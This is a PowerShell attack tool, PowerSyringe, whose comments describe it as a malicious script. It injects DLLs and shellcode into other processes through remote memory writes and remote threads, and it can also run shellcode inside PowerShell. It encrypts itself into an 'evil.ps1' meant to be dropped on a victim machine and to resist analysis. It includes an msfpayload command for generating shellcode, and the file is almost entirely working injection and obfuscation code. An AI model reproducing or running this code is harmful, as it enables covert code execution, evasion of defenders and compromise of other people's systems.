Set-StrictMode -Version 2

function PowerSyringe
{
##################################################################
#.Synopsis
# Powershell-based (self-encrypting) shellcode and DLL injection utility
# Author: Matthew Graeber (@mattifestation)
# License: GNU GPL v3
#.Description
# PowerSyringe is a generic code injection utility with the following features:
#
# * DLL Injection
# * Shellcode injection
# * 32 and 64-bit support
# * Encryption to make analysis difficult/impossible
# * In-memory decryption
#
# This project was based upon syringe.c v1.2 written by Spencer McIntyre
#
# PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use this command from within Backtrack (Thanks, Matt and g0tm1lk):
#
# msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread C | sed '1,6d;s/[";]//g;s/\\/,0/g' | tr -d '\n' | cut -c2- 
#
# Make sure to specify 'thread' for your exit process. Also, don't bother encoding your shellcode. It's entirely unnecessary.
#
# Why did you write this in Powershell?
# 1) Because I wanted to. Enough said.
# 2) This will be the first in hopefully many future malicious Powershell scripts
# 3) No need for an executable
# 4) I <3 leveraging built-in tools to attack people >D
#
# Features to add (maybe)
# - ability to pass shellcode as a parameter. I kind of like it hardcoded.
#   I'll add it if enough people want it.
# - Increase stability when executing shellcode from within Powershell.
#.Parameter opmode
# Operating mode:
# 1) DLL injection
# 2) Inject shellcode into another process
# 3) Execute shellcode within Powershell
# 4) Encrypt this script
#.Parameter processID
# Process ID of the process you want to inject your shellcode into.
#.Parameter dll
# Name of the dll to inject. This can be an absolute or relative path.
#.Parameter scriptPath
# Path to this script
#.Parameter password
# Password to encrypt/decrypt the script
#.Parameter salt
# Salt value for encryption/decryption. This can be any string value.
#.Parameter iv
# Initialization vector. This can be any 16 character string value.
#.Example
# C:\PS>PowerSyringe 1 4274 evil.dll
# 
# Description
# -----------
# Inject 'evil.dll' into process ID 4274.
#.Example
# C:\PS>PowerSyringe 2 4274
# 
# Description
# -----------
# Inject the shellcode as defined in the script into process ID 4274
#.Example
# C:\PS>PowerSyringe 3
# 
# Description
# -----------
# Execute the shellcode as defined in the script within the context of Powershell.
#.Example
# C:\PS>PowerSyringe 4 .\PowerSyringe.ps1 password salty
# 
# Description
# -----------
# Encrypt the contents of this file with a password and salt. This will make analysis of the
# script impossible without the correct password and salt combination. This command will
# generate evil.ps1 that can dropped onto the victim machine. It only consists of a
# decryption function 'de' and the base64-encoded ciphertext.
#
# Note: This command can be used to encrypt any text-based file/script
#.Example
# C:\PS>[String] $cmd = Get-Content .\evil.ps1
# C:\PS>Invoke-Expression $cmd
# C:\PS>$decrypted = de password salt
# C:\PS>Invoke-Expression $decrypted
# 
# Description
# -----------
# After you run the encryption option and generate evil.ps1 these commands will decrypt and execute
# (i.e. define the function) PowerSyringe assuming you provided the proper password and salt combination.
# 
# Upon successful completion of these commands, you can execute PowerSyringe as normal.
#
# Note: "Invoke-Expression $decrypted" may generate an error. Just ignore it. PowerSyringe will
# still work.
#.Link
# My blog: http://www.exploit-monday.com
# Original syringe code: http://www.securestate.com/Documents/syringe.c
##################################################################
[CmdletBinding(DefaultParameterSetName = "2")] Param (
[ValidateRange(1,4)]
[Parameter(Position = 0, Mandatory = $True)]
[Int] $opmode,
[ValidateRange(1,99999)]
[Parameter(Position = 1, Mandatory = $True, ParameterSetName = "1")]
[Parameter(Position = 1, ParameterSetName = "2")]
[Int] $processID,
[Parameter(Position = 2, Mandatory = $True, ParameterSetName = "1")] [String] $dll,
[Parameter(Position = 1, Mandatory = $True, ParameterSetName = "4")] [String] $scriptPath,
[Parameter(Position = 2, Mandatory = $True, ParameterSetName = "4")] [String] $password,
[Parameter(Position = 3, Mandatory = $True, ParameterSetName = "4")] [String] $salt
)

$code = @"
using System;
using System.Runtime.InteropServices;

namespace k32
{
    public class func
    {
        [Flags]
        public enum ProcessAccessFlags : uint
        {
        All = 0x001F0FFF,
        CreateThread = 0x00000002
        }

        [Flags]
        public enum AllocationType
        {
        Commit = 0x1000,
        Reserve = 0x2000
        }

        [Flags]
        public enum MemoryProtection
        {
        ExecuteReadWrite = 0x40,
        ReadWrite = 0x04
        }

        [Flags]
        public enum Time : uint
        { Infinite = 0xFFFFFFFF }

        [DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(IntPtr hProcess, [Out] IntPtr Wow64Process);
        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(ProcessAccessFlags dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32.dll")]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, [Out] IntPtr lpNumberOfBytesWritten);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, [Out] IntPtr lpflOldProtect);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);
        [DllImport("kernel32.dll")]
        public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
    }
}
"@

$codeProvider = New-Object Microsoft.CSharp.CSharpCodeProvider
$location = [PsObject].Assembly.Location
$compileParams = New-Object System.CodeDom.Compiler.CompilerParameters
$assemblyRange = @("System.dll", $location)
$compileParams.ReferencedAssemblies.AddRange($assemblyRange)
$compileParams.GenerateInMemory = $True
$output = $codeProvider.CompileAssemblyFromSource($compileParams, $code)

$global:result = 14

# Insert your shellcode here in the for 0xXX,0xXX,...
# 32-bit payload
# msfpayload windows/exec CMD="cmd /k calc" EXITFUNC=thread
32bitshellcodehere

# 64-bit payload.how to generate :
64bitshellcodehere

    function Inject-DLL([Int] $id, [String] $dll)
    {
        $path = Resolve-Path $dll
        $dll = $path.ToString()
        Write-Host $dll
        $enc = New-Object "System.Text.ASCIIEncoding"
        $dllByteArray = $enc.GetBytes($dll)

        # Open a handle to the process you want to inject into
        $procHandle = [k32.func]::OpenProcess([k32.func+ProcessAccessFlags]::All, 0, $id)
        if ([Bool]!$procHandle) { $global:result = 2; return } # Error in opening handle. Did you provide a valid process ID?

        if ((Get-WmiObject Win32_Processor AddressWidth).AddressWidth -ne 32) # Only perform theses checks if CPU is 64-bit
        {
            # Parse PE header to see if DLL was compiled 32 or 64-bit
            $stream = New-Object System.IO.FileStream($dll, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read)
            $temp = $stream.Seek(0x3c, [System.IO.SeekOrigin]::Begin)
            [Byte[]]$arr = New-Object Byte[](4)
            $temp = $stream.Read($arr,0,4)
            $j = 1
            $peoffset = 0
            for ($i=0; $i -le 3; $i++) {
            $peoffset += [Int]($arr[$i] * $j)
            Write-Host "PE Offset: " + $peoffset.ToString("X8")
            $j *= 0x100
            }
            $temp = $stream.Seek($peoffset+4, [System.IO.SeekOrigin]::Begin)
            [Byte[]]$arr2 = New-Object Byte[](2)
            $temp = $stream.Read($arr2,0,2)
            $j = 1
            $arch = 0
            for ($i=0; $i -le 1; $i++) {
            $arch += [Int]($arr2[$i] * $j)
            $j *= 0x100
            }
            $archStr = $arch.ToString("X4")
            Write-Host "Architecture: " + $archStr
            if (($archStr -ne "014C") -and ($archStr -ne "8664")) { $global:result = 10; return } # Unsupported architecture
            $temp = $stream.Close()
            
            Write-Host "Architecture: " + $archStr

            # Determine is the process specified is 32 or 64 bit
            [Byte[]]$wow64 = 0xFF
            $wow64Ptr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($wow64,0)
            $temp = [k32.func]::IsWow64Process($procHandle, $wow64Ptr)
            if (([IntPtr]::Size -eq 4) -and (($archStr -eq "8664") -or [Bool]!$wow64)) { $global:result = 13; return } # You're attempting to manipulate 64-bit code within a 32-bit version of PS.
            if ([Bool]!$wow64 -and ($archStr -eq "014C")) { $global:result = 11; return } # You can't inject a 32-bit DLL into a 64-bit process
            if ([Bool]$wow64 -and ($archStr -eq "8664")) { $global:result = 12; return } # You can't inject a 64-bit DLL into a 32-bit process
            elseif ([Bool]!$wow64){ $sc = $sc64 } # Use the 64-bit shellcode
        }

        # Get address of LoadLibraryA function
        $k32handle = [k32.func]::GetModuleHandle("kernel32.dll")
        $loadLibAddr = [k32.func]::GetProcAddress($k32handle, "LoadLibraryA")
        if ([Bool]!$loadLibAddr) { $global:result = 5; return } # Could not determine the address of LoadLibraryA function

        # Reserve and commit memory to hold name of dll
        $strPtr = [k32.func]::VirtualAllocEx($procHandle, 0, $dll.Length, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ReadWrite)
        if ([Bool]!$strPtr) { $global:result = 3; return } # Couldn't allocate remote memory

        # Write the name of the dll to the remote process address space
        $success = [k32.func]::WriteProcessMemory($procHandle, $strPtr, $dllByteArray, $dll.Length, 0)
        if ([Bool]!$success) { $global:result = 4; return } # Error in writing memory

        # Execute dll as a remote thread
        [IntPtr] $threadHandle = [k32.func]::CreateRemoteThread($procHandle, 0, 0, $loadLibAddr, $strPtr, 0, 0)
        if ([Bool]!$threadHandle) { $global:result = 7; return } # Error launching remote thread

        # Close proces handle
        $success = [k32.func]::CloseHandle($procHandle)
        if ([Bool]!$success) { $global:result = 8; return } # Unable to close process handle

        $global:result = 1
        return
    }

    function Inject-Shellcode-Into-Remote-Proc([Int] $id)
    {
        # Open a handle to the process you want to inject into
        $procHandle = [k32.func]::OpenProcess([k32.func+ProcessAccessFlags]::All, 0, $id)
        if ([Bool]!$procHandle) { $global:result = 2; return } # Error in opening handle. Did you provide a valid process ID?

        [Byte[]]$wow64 = 0xFF
        if ((Get-WmiObject Win32_Processor AddressWidth).AddressWidth -ne 32) # Only perform theses checks if CPU is 64-bit
        {
            # Determine is the process specified is 32 or 64 bit
            $wow64Ptr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($wow64,0)
            $temp = [k32.func]::IsWow64Process($procHandle, $wow64Ptr)
            if ([Bool]!$wow64 -and ([IntPtr]::Size -eq 4)) { $global:result = 9; return } # You can't inject 64-bit shellcode from within 32-bit Powershell
            elseif ([Bool]!$wow64){ $sc = $sc64 } # Use the 64-bit shellcode
        } else { $wow64[0] = 1 }

        # Reserve and commit enough memory in remote process to hold the shellcode
        $baseAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $sc.Length + 1, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)
        if ([Bool]!$baseAddr) { $global:result = 3; return } # Couldn't allocate remote memory

        # Copy shellcode into the previously allocated memory
        [Int[]] $bytesWritten = 0
        $bytesWrittenPtr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($bytesWritten,0)
        $success = [k32.func]::WriteProcessMemory($procHandle, $baseAddr, $sc, $sc.Length, $bytesWrittenPtr)
        if ([Bool]!$success) { $global:result = 4; return } # Error in writing memory

        # Get address of ExitThread function
        $k32handle = [k32.func]::GetModuleHandle("kernel32.dll")
        $exitThreadAddr = [k32.func]::GetProcAddress($k32handle, "ExitThread")
        if ([Bool]!$exitThreadAddr) { $global:result = 5; return } # Could not determine the address of ExitThread function

        # Save address of ExitThread as little-endian byte array
        [Byte[]] $exitThreadAddrLEbytes = New-Object Byte[](4)
        $i=0
        $exitThreadAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$exitThreadAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}
        [System.Array]::Reverse($exitThreadAddrLEbytes)

        # Save pointer to beginning of shellcode in remote process as a little-endian byte array
        $baseAddrLEbytes = New-Object Byte[](4)
        $i=0
        $baseAddr.ToString("X8") -split '([A-F0-9]{2})' | % { if ($_) {$baseAddrLEbytes[$i] = [System.Convert]::ToByte($_,16); $i++}}
        [System.Array]::Reverse($baseAddrLEbytes)

        if ([Bool]$wow64) {
            # Build 32-bit inline assembly stub to call the shellcode upon creation of a remote thread. Ugly way to invoke inline assembly in Powershell but it works.
            [Byte[]] $callRemoteThread = 0xB8 # MOV EAX,address
            $callRemoteThread += $baseAddrLEbytes # MOV EAX, &shellcode
            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0xB8 # CALL EAX # PUSH 0 # MOV EAX, address
            $callRemoteThread += $exitThreadAddrLEbytes # &ExitThread
            $callRemoteThread += 0xFF,0xD0 # CALL ExitThread
            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)
        } else {
            # Build 64-bit inline assembly stub to call the shellcode upon creation of a remote thread.
            [Byte[]] $callRemoteThread = 0x48,0xC7,0xC0 # MOV RAX,address
            $callRemoteThread += $baseAddrLEbytes # MOV RAX, &shellcode
            $callRemoteThread += 0xFF,0xD0,0x6A,0x00,0x48,0xC7,0xC0 # CALL RAX # PUSH 0 # MOV RAX, address
            $callRemoteThread += $exitThreadAddrLEbytes # &ExitThread
            $callRemoteThread += 0xFF,0xD0 # CALL ExitThread
            $callRemoteThreadAddr = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($callRemoteThread,0)
        }

        # Allocate 32-bit inline assembly stub
        $remoteStubAddr = [k32.func]::VirtualAllocEx($procHandle, 0, $callRemoteThread.Length, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)
        if ([Bool]!$remoteStubAddr) { $global:result = 3; return } # Couldn't allocate remote memory

        # Mark inline assembly stub as RWX
        [Int[]] $OldProtect = 0
        $pOldProtect = [System.Runtime.InteropServices.Marshal]::UnsafeAddrOfPinnedArrayElement($OldProtect,0)
        $success = [k32.func]::VirtualProtect($callRemoteThreadAddr, $callRemoteThread.Length, [k32.func+MemoryProtection]::ExecuteReadWrite, $pOldProtect)
        if ([Bool]!$success) { $global:result = 6; return } # Could not change memory permissions

        # Write 32-bit assembly stub to remote process memory space
        $success = [k32.func]::WriteProcessMemory($procHandle, $remoteStubAddr, $callRemoteThread, $callRemoteThread.Length, $bytesWrittenPtr)
        if ([Bool]!$success) { $global:result = 4; return } # Error in writing memory

        # Execute shellcode as a remote thread
        [IntPtr] $threadHandle = [k32.func]::CreateRemoteThread($procHandle, 0, 0, $remoteStubAddr, $baseAddr, 0, 0)
        if ([Bool]!$threadHandle) { $global:result = 7; return } # Error launching remote thread

        # Close proces handle
        $success = [k32.func]::CloseHandle($procHandle)
        if ([Bool]!$success) { $global:result = 8; return } # Unable to close process handle

        $global:result = 1
        return
    }

    function Execute-Shellcode-Within-PS
    {
        if ([IntPtr]::Size -eq 8) { $sc = $sc64 }
    
        # Allocate RWX memory for the shellcode
        $baseAddr = [k32.func]::VirtualAlloc(0, $sc.Length + 1, [k32.func+AllocationType]::Reserve -bOr [k32.func+AllocationType]::Commit, [k32.func+MemoryProtection]::ExecuteReadWrite)
        if ([Bool]!$baseAddr) { $global:result = 3; return } # Couldn't allocate remote memory

        # Copy shellcode to RWX buffer
        [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $baseAddr, $sc.Length)

        # Launch shellcode in it's own thread
        [IntPtr] $threadHandle = [k32.func]::CreateThread(0,0,$baseAddr,0,0,0)
        if ([Bool]!$threadHandle) { $global:result = 7; return } # Error launching remote thread

        # Wait for shellcode thread to terminate
        $temp = [k32.func]::WaitForSingleObject($threadHandle, [k32.func+Time]::Infinite)

        $global:result = 1
        return
    }

function Encrypt-Command([String] $scriptPath, [String] $password, [String] $salt)
{
$enc = New-Object System.Text.ASCIIEncoding
$ivBytes = $enc.GetBytes("CRACKMEIFYOUCAN!")
# While this can be used to encrypt any file, it's primarily designed to encrypt itself.
[Byte[]] $scriptBytes = get-content -encoding byte -path $scriptPath
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($password, $enc.GetBytes($salt), "SHA1", 2)
$key = New-Object System.Security.Cryptography.RijndaelManaged
$key.Mode = [System.Security.Cryptography.CipherMode]::CBC
[Byte[]] $KeyBytes = $derivedPass.GetBytes(32)
$encryptor = $key.CreateEncryptor($KeyBytes, $ivBytes)
$stream = New-Object System.IO.MemoryStream
$cryptoStream = New-Object System.Security.Cryptography.CryptoStream($stream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
$cryptoStream.Write($scriptBytes, 0, $scriptBytes.Length)
$cryptoStream.FlushFinalBlock()
$CipherTextBytes = $stream.ToArray()
$stream.Close()
$cryptoStream.Close()
$key.Clear()
$cipher = [Convert]::ToBase64String($CipherTextBytes)

# Generate encrypted PS1 file. All that will be included is the base64-encoded ciphertext and a slightly 'obfuscated' decrypt function
$output = 'function de([String] $b, [String] $c)
{
$a = "'
$output += $cipher
$output += '"'
$output += ';
$encoding = New-Object System.Text.ASCIIEncoding;
$dd = $encoding.GetBytes("CRACKMEIFYOUCAN!");
$aa = [Convert]::FromBase64String($a);
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2);
[Byte[]] $e = $derivedPass.GetBytes(32);
$f = New-Object System.Security.Cryptography.RijndaelManaged;
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]] $h = New-Object Byte[]($aa.Length);
$g = $f.CreateDecryptor($e, $dd);
$i = New-Object System.IO.MemoryStream($aa, $True);
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read);
$r = $j.Read($h, 0, $h.Length);
$i.Close();
$j.Close();
$f.Clear();
return $encoding.GetString($h,0,$h.Length);
}'

# Output decrypt function and ciphertext to evil.ps1
$output | Out-File -encoding ASCII .\evil.ps1

$temp = Resolve-Path .\evil.ps1
$out = "Encrypted PS1 file saved to: " + $temp.ToString()
Write-Host $out

$global:result = 1
return
}

switch ($opmode)
{
1 { Inject-DLL $processID $dll}
2 { Inject-Shellcode-Into-Remote-Proc $processID }
3 { Execute-Shellcode-Within-PS }
4 { Encrypt-Command $scriptPath $password $salt}
}

switch ($global:result) 
{
1 {"Command executed successfully!"}
2 {"Error: Unable to open process handle. Did you provide a valid process ID?"}
3 {"Error: Unable to allocate memory."}
4 {"Error: Unable to write to remote process address space."}
5 {"Error: Unable to determine address of the function."}
6 {"Error: Unable to change memory permissions."}
7 {"Error: Unable to launch remote thread."}
8 {"Error: Unable to close process handle"}
9 {"Error: Unable to inject 64-bit shellcode from within 32-bit Powershell. Use the 64-bit version of Powershell if you want this to work."}
10 {"Error: Only x86 or AMD64 architechtures supported. Are you using Itanium?"}
11 {"Error: You can't inject a 32-bit DLL into a 64-bit process"}
12 {"Error: You can't inject a 64-bit DLL into a 32-bit process"}
13 {"Error: You can't manipulate 64-bit code within 32-bit PowerShell. Open the 64-bit version and try again."}
14 {"Error: Unknown error"}
}

}
